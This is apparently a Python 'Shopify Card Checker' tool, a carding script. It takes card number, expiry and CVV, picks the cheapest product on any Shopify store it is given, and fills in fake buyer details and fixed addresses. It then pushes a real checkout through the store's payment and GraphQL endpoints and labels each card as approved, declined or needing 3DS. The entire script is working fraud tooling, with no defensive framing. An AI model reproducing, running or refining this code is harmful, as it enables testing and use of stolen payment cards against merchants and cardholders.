...
# ==================== GRAPHQL QUERIES (complete and working) ====================
...
def scc4(ccx):
    try:
        cc_clean = re.sub(r'[^\d]', '', str(ccx))
        if len(cc_clean) < 15 or len(cc_clean) > 16:
            return {'status': False, 'formatted': ccx, 'bin': cc_clean[:6] if len(cc_clean) >= 6 else '', 'error': 'Invalid card length'}
        def luhn_check(card_num):
            ...
            return total % 10 == 0
        if not luhn_check(cc_clean):
            return {'status': False, 'formatted': ' '.join([cc_clean[i:i+4] for i in range(0, len(cc_clean), 4)]), 'bin': cc_clean[:6], 'error': 'Luhn check failed'}
        formatted_cc = ' '.join([cc_clean[i:i+4] for i in range(0, len(cc_clean), 4)])
        bin_number = cc_clean[:6]
        card_type = "Unknown"
        first_digit = cc_clean[0]
        if first_digit == '4': card_type = "Visa"
        elif first_digit == '5': card_type = "MasterCard"
        elif first_digit == '3': card_type = "Amex"
        elif first_digit == '6': card_type = "Discover"
        return {'status': True, 'formatted': formatted_cc, 'bin': bin_number, 'type': card_type, 'error': None}
    except Exception as e:
        return {'status': False, 'formatted': str(ccx), 'bin': '', 'error': str(e)}

def sh(card):
    result = scc4(card)
    if result['status'] and result['formatted']:
...
def extract_from_json(text, key):
...
def get_address_details(country_code):
    ...
    addresses = {
        ...
        'MY': {
            'address': "Jalan Tunku Abdul Rahman 1",
            'city': "Kuala Lumpur",
            'state': "Kuala Lumpur",
            'zip': "50100",
            'phone': "+60312345678",
        ...
        'TH': {
            'address': "1 Ratchadamnoen Avenue",
            'city': "Bangkok",
            'state': "Bangkok",
            'zip': "10200",
            'phone': "+6621234567",
    ...
    # Return address for the detected country, fallback to US if not found
    return addresses.get(country_code, addresses['US'])

async def create_payment_session(session, cc, mon, year, cvv, random_info, site_url):
    endpoints = [
    ...
    for endpoint in endpoints:
        try:
            ...
            print(f"Creating payment session on {endpoint}...")
            session_response = await session.post(endpoint, headers=headers, json=json_data)
            if session_response.status_code == 200:
                session_id = session_response.json().get('id')
                print(f"✅ Payment session created: {session_id[:20]}...")
                return session_id
            else:
                print(f"Payment session failed: HTTP {session_response.status_code}")
        except Exception as e:
            print(f"Payment session exception: {e}")
            continue
    return None

def build_proposal_payload(session_token, queue_token, stable_id, checkout_token,
                           variant_id, price_str, address, country_code, web_build_id,
                           random_info):
    return {
        ...
        "variables": {
            ...
            "merchandise": {
                "merchandiseLines": [{
                    ...
                    "expectedTotalPrice": {"value": {"amount": price_str, "currencyCode": address['currency']}},
...
def build_submit_payload(session_token, queue_token, stable_id, checkout_token,
                         variant_id, price_str, address, country_code,
                         handle, delivery_amount, tax, total, sessionid, payment_method_identifier, site_url):
    return {
        "query": SUBMIT_QUERY,
        "variables": {
            "input": {
                ...
                "delivery": {
                    "deliveryLines": [{
                        ...
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {
                            "value": {"amount": delivery_amount, "currencyCode": address['currency']}
                        },
                ...
                "merchandise": {
                    "merchandiseLines": [{
                        ...
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {
                            "value": {"amount": price_str, "currencyCode": address['currency']}
                        },
                        "lineComponentsSource": None,
                        "lineComponents": []
                    }]
                ...
                "payment": {
                    ...
                    "paymentLines": [{
                        ...
                        "amount": {"value": {"amount": total, "currencyCode": address['currency']}},
                        "dueAt": None
                    }],
                    "billingAddress": {
                        "streetAddress": {
                ...
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {
                        "value": {"amount": tax, "currencyCode": address['currency']}
                    },
            ...
            "metafields": [],
            "analytics": {
                "requestUrl": f"{site_url}/checkouts/cn/{checkout_token}",
                "pageId": stable_id
            }
        },
...
async def poll_for_receipt(session, site_url, session_token, checkout_token, web_build_id,
                           receipt_id, ua, product_title, price_str, formatted_cc,
                           card_check, mon, year):
    print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 🔄 Polling for receipt ID: {receipt_id}")
    poll_url = f"{site_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
    poll_headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': site_url,
    ...
    for attempt in range(1, 16):
        print(f"Poll attempt {attempt}/15...")
        await asyncio.sleep(4)
        try:
            resp = await session.post(poll_url, headers=poll_headers, json=poll_payload)
            ...
            if f"{site_url}/thank_you" in text or "Your order is confirmed" in text:
                result_text = f"✅ APPROVED - {formatted_cc}\n💰 Amount: ${price_str}"
                return result_text, None
            elif 'INCORRECT_ZIP' in text:
                result_text = f"❌ DECLINED - INCORRECT ZIP"
                return result_text, None
            elif 'INSUFFICIENT_FUNDS' in text:
                result_text = f"❌ DECLINED - INSUFFICIENT FUNDS"
                return result_text, None
            elif 'INCORRECT_CVC' in text:
                result_text = f"❌ DECLINED - INCORRECT CVC"
                return result_text, None
            elif 'CompletePaymentChallenge' in text or 'AUTHORIZATION_ERROR' in text or '/authentications/' in text:
                result_text = f"🟡 3DS REQUIRED - {formatted_cc}\n💰 Amount: ${price_str}"
                return result_text, None
            elif receipt.get('__typename') == 'FailedReceipt':
                err = receipt.get('processingError', {}).get('code', 'Unknown')
                result_text = f"❌ DECLINED - {err}"
                return result_text, None
            elif receipt.get('__typename') in ('ProcessingReceipt', 'WaitingReceipt'):
                continue
            else:
                continue
        except Exception as e:
    ...
    return f"⚠️ TIMEOUT - {formatted_cc}", None

# ==================== SIMPLE RANDOM INFO CLASS ====================
class SimpleShopify:
...
async def process_card(site_url, card_string):
    async with httpx.AsyncClient(follow_redirects=True, timeout=120.0) as session:
        try:
            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 🚀 Processing card for site: {site_url}")

            # ---------- Parse card ----------
            try:
                parts = card_string.split('|')
                if len(parts) != 4:
                    return None, "Invalid format! Use: 5306914932131024|02|28|388"
                cc, mon, year, cvv = parts
                mon = mon.zfill(2)
                if len(year) == 2:
                    year = '20' + year
                print(f"Card: {cc[:6]}...{cc[-4:]} | Exp: {mon}/{year} | CVV: {cvv}")
            except:
                return None, "Invalid format! Use: 5306914932131024|02|28|388"
            ...
            card_check = scc4(cc)
            formatted_cc = sh(cc)
            card_type = card_check.get('type', 'Unknown') if card_check['status'] else 'Unknown'
            if not card_check['status']:
                return None, f"Invalid card: {card_check.get('error')}"
            print(f"Card type: {card_type}, BIN: {card_check.get('bin', 'N/A')}")

            # ---------- Get cheapest product ----------
            ua = USER_AGENT
            headers = {'User-Agent': ua, 'Accept': 'application/json'}
            products_url = f"{site_url.rstrip('/')}/products.json"
            print(f"Fetching products from {products_url}")
            resp = await session.get(products_url, headers=headers)
            if resp.status_code != 200:
                return None, "Could not fetch products"
            data = resp.json()
            min_price = None
            min_variant_id = None
            min_price_str = None
                ...
                for variant in product.get('variants', []):
                    ...
                    if price >= 0.01 and variant.get('available', True) is not False:
                        if min_price is None or price < min_price:
                            ...
                            min_price_str = variant['price']
                            product_title = product['title']
            if min_variant_id is None:
                return None, "No suitable product found"
            print(f"Using product: {product_title} (${min_price_str})")

            # ---------- Add to cart ----------
            cart_add_url = f"{site_url}/cart/{min_variant_id}:1"
            print(f"Adding to cart: {cart_add_url}")
            await session.get(cart_add_url, headers=headers, follow_redirects=True)
            cart_js_url = f"{site_url}/cart.js"
            cart_resp = await session.get(cart_js_url, headers=headers)
            if cart_resp.status_code != 200:
                return None, "Could not get cart token"
            cart_data = cart_resp.json()
            token = cart_data.get('token')
            if not token:
                return None, "No cart token"
            ...
            post_data = {'checkout': '', 'updates[]': '1'}
            checkout_resp = await session.post(f"{site_url}/cart", headers=checkout_headers, data=post_data)
            ...
            if DEBUG_SAVE_HTML:
                ...
                print("💾 Saved checkout HTML to debug_checkout.html")

            # ---------- Check for JavaScript redirect ----------
            redirect_url = get_redirect_url(response_text)
            if redirect_url:
                print(f"🔁 Following redirect to: {redirect_url}")
                redirect_resp = await session.get(redirect_url, headers={'User-Agent': ua})
                if redirect_resp.status_code != 200:
                    return None, f"Redirect failed: {redirect_resp.status_code}"
                response_text = redirect_resp.text
                if DEBUG_SAVE_HTML:
                    with open("debug_checkout_final.html", "w", encoding="utf-8") as f:
                        f.write(response_text)
                    print("💾 Saved final checkout HTML to debug_checkout_final.html")
                final_url = str(redirect_resp.url)
            else:
                final_url = str(checkout_resp.url)

            # ---------- Extract tokens ----------
            session_token = find_between(response_text, 'name="serialized-sessionToken" content="&quot;', '&quot;"')
            if not session_token:
                session_token = find_between(response_text, '<meta name="serialized-session-token" content="&quot;', '&quot;"')
            print(f"Session token: {session_token[:20] if session_token else 'None'}...")

            queue_token = find_between(response_text, 'queueToken&quot;:&quot;', '&quot;')
            print(f"Queue token: {queue_token[:20] if queue_token else 'None'}...")

            stable_id = find_between(response_text, 'stableId&quot;:&quot;', '&quot;')
            print(f"Stable ID: {stable_id}")

            payment_method_identifier = find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            print(f"Payment Method ID: {payment_method_identifier}")

            web_build_id = find_between(response_text, '<meta name="serialized-environment" content="{&quot;commitSha&quot;:&quot;', '&quot;,&quot;debug&quot;')
            print(f"Web build ID: {web_build_id}")

            checkout_token_match = None
            match = re.search(r'/cn/([^/?]+)', final_url)
            if match:
                checkout_token_match = match.group(1)
            else:
                parsed = urlparse(final_url)
                qs = parse_qs(parsed.query)
                if 'source_id' in qs:
                    checkout_token_match = qs['source_id'][0]
            print(f"Checkout token: {checkout_token_match}")
            ...
            if not payment_method_identifier: missing.append("payment_method_identifier")
            if not checkout_token_match: missing.append("checkout_token_match")
            if missing:
                print(f"❌ Missing tokens: {', '.join(missing)}")
                return None, "Failed to extract checkout tokens"

            # ---------- Detect store's default country from the checkout page ----------
            country_code = 'US'  # fallback
            country_select_match = re.search(r'<select[^>]*name="countryCode"[^>]*>.*?<option[^>]*selected[^>]*value="([^"]+)"', response_text, re.DOTALL)
            if country_select_match:
                country_code = country_select_match.group(1)
                print(f"🌍 Detected country from checkout: {country_code}")
            else:
                print("🌍 No country select found, using US as fallback")

            # ---------- Generate random buyer info ----------
            shop = SimpleShopify()
            random_info = await shop.get_random_info()
            address_details = get_address_details(country_code)
            print(f"Buyer: {random_info['fname']} {random_info['lname']}, Email: {random_info['email']}, Phone: {random_info['phone']}")
            print(f"Using address: {address_details['address']}, {address_details['city']}, {address_details['state']} {address_details['zip']}, {address_details['country']}")

            # ---------- Create payment session ----------
            sessionid = await create_payment_session(session, cc, mon, year, cvv, random_info, site_url)
            if not sessionid:
                return None, "Could not create payment session"
            print(f"Payment session ID: {sessionid[:20]}...")

            # ---------- Proposal mutation ----------
            proposal_payload = build_proposal_payload(
                session_token, queue_token, stable_id, checkout_token_match,
                min_variant_id, min_price_str, address_details, country_code,
                web_build_id, random_info
            )
            proposal_headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
            ...
            proposal_url = f"{site_url}/checkouts/unstable/graphql?operationName=Proposal"
            print("Sending Proposal mutation...")
            proposal_resp = await session.post(proposal_url, headers=proposal_headers, json=proposal_payload)
            if proposal_resp.status_code != 200:
                return None, f"Proposal failed: {proposal_resp.status_code}"
            proposal_data = proposal_resp.json()

            print("\n📦 Proposal response preview:")
            print(json.dumps(proposal_data, indent=2)[:1000])
            if 'errors' in proposal_data:
                print("\n❌ GraphQL Errors:")
                for err in proposal_data['errors']:
                    print(f"  - {err.get('message')} (code: {err.get('extensions', {}).get('code')})")
                return None, "Proposal failed – see errors above"
            if not proposal_data.get('data', {}).get('session', {}).get('negotiate', {}).get('result'):
                print("\n❌ No result in proposal data")
                return None, "Proposal returned no result"

            seller_proposal = proposal_data['data']['session']['negotiate']['result']['sellerProposal']
            delivery_lines = seller_proposal.get('delivery', {}).get('deliveryLines', [])
            if not delivery_lines:
                return None, "No delivery lines"
            available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
            if not available_strategies:
                return None, "No delivery strategies"
            handle = available_strategies[0].get('handle')
            delivery_amount = available_strategies[0].get('amount', {}).get('value', {}).get('amount')
            tax = seller_proposal.get('tax', {}).get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
            total = seller_proposal.get('runningTotal', {}).get('value', {}).get('amount')
            print(f"Delivery handle: {handle}, delivery amount: {delivery_amount}, tax: {tax}, total: {total}")

            # ---------- SubmitForCompletion mutation ----------
            submit_payload = build_submit_payload(
                session_token, queue_token, stable_id, checkout_token_match,
                min_variant_id, min_price_str, address_details, country_code,
                handle, delivery_amount, tax, total, sessionid, payment_method_identifier,
                site_url
            )
            submit_headers = {
                'accept': 'application/json',
            ...
            submit_url = f"{site_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
            print("Sending SubmitForCompletion mutation...")
            submit_resp = await session.post(submit_url, headers=submit_headers, json=submit_payload)
            if submit_resp.status_code != 200:
                return None, f"SubmitForCompletion failed: {submit_resp.status_code}"
            if 'CAPTCHA_METADATA_MISSING' in submit_resp.text:
                return "⚠️ CAPTCHA required", None

            # ---------- Detailed submit response handling ----------
            submit_data = submit_resp.json()
            if 'errors' in submit_data:
                print("\n❌ Submit GraphQL Errors:")
                for err in submit_data['errors']:
                    print(f"  - {err.get('message')} (code: {err.get('extensions', {}).get('code')})")
                return None, "Submit failed – see errors above"

            completion = submit_data.get('data', {}).get('submitForCompletion', {})
            typename = completion.get('__typename')

            if typename == 'SubmitSuccess' or typename == 'SubmitAlreadyAccepted' or typename == 'SubmittedForCompletion':
                receipt = completion.get('receipt')
                if receipt and receipt.get('id'):
                    receipt_id = receipt['id']
                else:
                    print("\n❌ Submit returned success but no receipt ID")
                    return None, "No receipt ID from submit"
            elif typename == 'SubmitRejected':
                errors = completion.get('errors', [])
                print("\n❌ Submit rejected:")
                for err in errors:
                    code = err.get('code')
                    msg = err.get('nonLocalizedMessage') or err.get('localizedMessage') or err.get('message', '')
                    print(f"  - {code}: {msg}")
                return None, "Card declined or rejected"
            elif typename == 'SubmitFailed':
                reason = completion.get('reason', 'Unknown')
                print(f"\n❌ Submit failed: {reason}")
                return None, f"Submit failed: {reason}"
            else:
                print(f"\n❌ Unknown submit response: {typename}")
                return None, "Unknown submit response"

            # ---------- Poll for receipt ----------
            result, error = await poll_for_receipt(
                session, site_url, session_token, checkout_token_match, web_build_id,
                receipt_id, ua, product_title, min_price_str, formatted_cc, card_check,
                mon, year
            )
            if error:
                return None, error
            ...
            return None, "Operation timed out! Site might be slow."
        except Exception as e:
            return None, f"Unexpected error: {str(e)}"

# ==================== MAIN CLI ====================
async def main():
    print("=== Shopify Card Checker CLI (Universal Edition) ===\n")
    site_url = input("Enter Shopify site URL (e.g., https://msudairystore.com): ").strip()
    card_string = input("Enter card (NUMBER|MM|YY|CVV): ").strip()
    
    result, error = await process_card(site_url, card_string)
    if error:
        print(f"\n❌ Error: {error}")
    else:
        print("\n" + "="*50)
